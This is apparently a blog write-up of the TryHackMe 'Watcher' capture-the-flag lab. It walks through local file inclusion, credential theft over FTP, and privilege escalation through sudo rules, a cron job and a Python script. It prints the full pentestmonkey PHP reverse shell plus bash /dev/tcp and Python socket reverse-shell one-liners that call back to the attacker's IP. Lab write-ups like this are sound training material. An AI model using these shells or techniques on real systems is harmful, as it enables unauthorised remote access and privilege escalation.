@@ -1,0 +1,330 @@
+I"-<h2 id="introduction">Introduction</h2>
+<p>This is partical room from tryhackme entitled “Watcher” with Medium difficulty. In this room we will learn about File Inclusion, LFI to RCE, Getting privilage from cronjob, and Python library injection. In this room we will doing lfi and getting any credential then exploit the box. Link room <a href="https://tryhackme.com/room/watcher">here</a></p>
+
+<h2 id="scanning">Scanning</h2>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>First time we have to do is scanning the Machine :</p>
+<pre><code class="language-bash">nmap 10.10.35.205 -sC -sV
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-20 23:42 WIB
+Nmap scan report for 10.10.35.205
+Host is up (0.34s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e1:80:ec:1f:26:9e:32:eb:27:3f:26:ac:d2:37:ba:96 (RSA)
+|   256 36:ff:70:11:05:8e:d4:50:7a:29:91:58:75:ac:2e:76 (ECDSA)
+|_  256 48:d2:3e:45:da:0c:f0:f6:65:4e:f9:78:97:37:aa:8a (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: Jekyll v4.1.1
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Corkplacemats
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 34.71 seconds
+
+
+</code></pre>
+
+<p>From the results of nmap we know there are 3 open ports including ftp, ssh, and webserver. Now let’s take a look the webserver :
+<img src="/assets/thm_watcher/bg_1.png" alt="img" /></p>
+
+<h2 id="getting-user">Getting User</h2>
+
+<p>First i’m going to robots.txt, and i found this :</p>
+
+<p><img src="/assets/thm_watcher/bg_2.png" alt="img" /></p>
+
+<p>Now lets looking at flag_1.txt.</p>
+
+<h3 id="flag-1">Flag 1</h3>
+
+<p><img src="/assets/thm_watcher/bg_3.png" alt="img" /></p>
+
+<p>Then we got first flag. now lets see the content of the webserver.</p>
+
+<p><img src="/assets/thm_watcher/bg_4.png" alt="img" /></p>
+
+<p>As you can see there is maybe php runs a script which displays a file. and i trying File Inclusion then change striped.php to <code>/etc/passwd</code>. From <code>http://10.10.35.205/post.php?post=striped.php</code> to <code>http://10.10.35.205/post.php?post=/etc/passwd</code>.</p>
+
+<p><img src="/assets/thm_watcher/bg_5.png" alt="img" /></p>
+
+<p>Then its works!!. Now lets see the secret file <code>/secret_file_do_not_read.txt</code> in <code>http://10.10.35.205/post.php?post=/secret_file_do_not_read.txt</code>.</p>
+
+<p><img src="/assets/thm_watcher/bg_6.png" alt="img" /></p>
+
+<p>And We found credentials of the ftp!, let’s check the ftp user .</p>
+
+<p><img src="/assets/thm_watcher/bg_7.png" alt="img" /></p>
+
+<h3 id="flag-2">Flag 2</h3>
+
+<p>As you can see we found flag_2.txt and get it.</p>
+<pre><code>$ cat flag_2.txt              
+FLAG{f------------e}
+</code></pre>
+<p>Now as you can see in ftp there is have files which is can be uploaded. then i want try to upload php-revershell.php from pentest monkey which contain :</p>
+<pre><code class="language-bat">&lt;?php
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.2.47.251';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+        // Fork and have the parent process exit
+        $pid = pcntl_fork();
+
+        if ($pid == -1) {
+                printit("ERROR: Can't fork");
+                exit(1);
+        }
+
+        if ($pid) {
+                exit(0);  // Parent exits
+        }
+
+        // Make the current process a session leader
+        // Will only succeed if we forked
+        if (posix_setsid() == -1) {
+                printit("Error: Can't setsid()");
+                exit(1);
+        }
+
+        $daemon = 1;
+} else {
+        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+        printit("$errstr ($errno)");
+        exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 =&gt; array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 =&gt; array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 =&gt; array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+        printit("ERROR: Can't spawn shell");
+        exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+        // Check for end of TCP connection
+        if (feof($sock)) {
+                printit("ERROR: Shell connection terminated");
+                break;
+        }
+
+        // Check for end of STDOUT
+        if (feof($pipes[1])) {
+                printit("ERROR: Shell process terminated");
+                break;
+        }
+
+        // Wait until a command is end down $sock, or some
+        // command output is available on STDOUT or STDERR
+        $read_a = array($sock, $pipes[1], $pipes[2]);
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+        // If we can read from the TCP socket, send
+        // data to process's STDIN
+        if (in_array($sock, $read_a)) {
+                if ($debug) printit("SOCK READ");
+                $input = fread($sock, $chunk_size);
+                if ($debug) printit("SOCK: $input");
+                fwrite($pipes[0], $input);
+        }
+
+        // If we can read from the process's STDOUT
+        // send data down tcp connection
+        if (in_array($pipes[1], $read_a)) {
+                if ($debug) printit("STDOUT READ");
+                $input = fread($pipes[1], $chunk_size);
+                if ($debug) printit("STDOUT: $input");
+                fwrite($sock, $input);
+        }
+
+        // If we can read from the process's STDERR
+        // send data down tcp connection
+        if (in_array($pipes[2], $read_a)) {
+                if ($debug) printit("STDERR READ");
+                $input = fread($pipes[2], $chunk_size);
+                if ($debug) printit("STDERR: $input");
+                fwrite($sock, $input);
+        }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+        if (!$daemon) {
+                print "$string\n";
+        }
+}
+
+?&gt; 
+
+</code></pre>
+<p>Let’s Upload :</p>
+
+<p><img src="/assets/thm_watcher/bg_8.png" alt="img" /></p>
+
+<p>After doing that you must set netcat <code>nc -lvnp 4444</code> for shell and we can go to file upload in <code>http://10.10.35.205/post.php?post=../../../../../home/ftpuser/ftp/files/php-reverse-shell.php</code>.</p>
+
+<p><img src="/assets/thm_watcher/bg_9.png" alt="img" /></p>
+
+<p>So now we have shell of webserver, then we get flag_3.txt.</p>
+
+<h3 id="flag-3">Flag 3</h3>
+
+<pre><code>www-data@watcher:$ cd /var/www/html/more_secrets_a9f10a
+www-data@watcher:/var/www/html/more_secrets_a9f10a$ ls
+flag_3.txt
+www-data@watcher:/var/www/html/more_secrets_a9f10a$ cat flag_3.txt
+cat flag_3.txt
+FLAG{l------------y}
+</code></pre>
+<p>Then i’m check the privilage with sudo -l and here is the output:</p>
+
+<pre><code class="language-bash">sudo -l
+Matching Defaults entries for www-data on watcher:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on watcher:
+    (toby) NOPASSWD: ALL
+</code></pre>
+<p>That you can see, the user www can access user toby and we can change user without using password with this command <code>sudo -u toby bash</code>.</p>
+
+<p><img src="/assets/thm_watcher/bg_10.png" alt="img" /></p>
+
+<h3 id="flag-4">Flag 4</h3>
+
+<p>And there is also have flag_4.txt</p>
+
+<pre><code>toby@watcher:~$ cat flag_4.txt                                                         
+cat flag_4.txt                                                                   
+FLAG{c------------e}
+</code></pre>
+<p>After that we can echo shell to cow.sh, i know it because there is have note.txt and explain the user of mat create cronjob with permision of mat. Now we can put revershell to cow.sh <code>echo "bash -i &gt;&amp; /dev/tcp/10.2.47.251/1234 0&gt;&amp;1" &gt;&gt; cow.sh</code></p>
+
+<p>Note.txt :</p>
+<pre><code>Hi Toby,
+
+I've got the cron jobs set up now so don't worry about getting that done.
+
+Mat
+</code></pre>
+<p><img src="/assets/thm_watcher/bg_11.png" alt="img" /></p>
+
+<h3 id="flag-5">Flag 5</h3>
+
+<p>Now we got the shell of user mat from the cronjob and also the flag_5.txt</p>
+<pre><code>mat@watcher:~$ cat flag_5.txt
+cat flag_5.txt
+FLAG{li--------------------------ow}
+</code></pre>
+<p>the user can access script python :</p>
+<pre><code>mat@watcher:~$ sudo -l
+sudo -l
+Matching Defaults entries for mat on watcher:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User mat may run the following commands on watcher:
+    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
+</code></pre>
+
+<p>Then there is have some text is note.txt :</p>
+<pre><code>Hi Mat,
+
+I've set up your sudo rights to use the python script as my user. You can only run the script with sudo so it should be safe.
+
+Will
+</code></pre>
+<p>Now we can change the script and doing Python Library injection with this command :</p>
+
+<pre><code class="language-bash">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.47.251",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+</code></pre>
+<p><img src="/assets/thm_watcher/bg_12.png" alt="img" /></p>
+
+<h3 id="flag-6">Flag 6</h3>
+
+<p>Then run this with user will without using any password. <code>sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py *</code></p>
+
+<p><img src="/assets/thm_watcher/bg_13.png" alt="img" /></p>
+
+<p>Boom! we got the user <code>will</code> also the flag_6.txt ofcourse :D</p>
+
+<pre><code>$ cat flag_6.txt
+FLAG{but_i_thought_my_script_was_secure}
+</code></pre>
+<h2 id="privilage-escalation">Privilage Escalation</h2>
+
+<p>After looking around i found <code>/opt/backups/key.bs64</code> and this is base64 encoded</p>
+
+<p><img src="/assets/thm_watcher/bg_14.png" alt="img" /></p>
+
+<p>We can decode it :</p>
+
+<p><img src="/assets/thm_watcher/bg_15.png" alt="img" /></p>
+
+<h3 id="last-flag">Last Flag</h3>
+
+<p>Then there is id_rsa key. we can access root now with the key we found.</p>
+
+<p><img src="/assets/thm_watcher/bg_16.png" alt="img" /></p>
+
+<p>Boom we are root now and having a the last of flag.</p>
+
+<pre><code>root@watcher:~# cat flag_7.txt 
+FLAG{wh--------------------rs}
+</code></pre>
+
+<p>so that’s all the writeup that I made now we have 7 flags, including root flag.
+Take care and Happy hacking :D</p>
+:ET
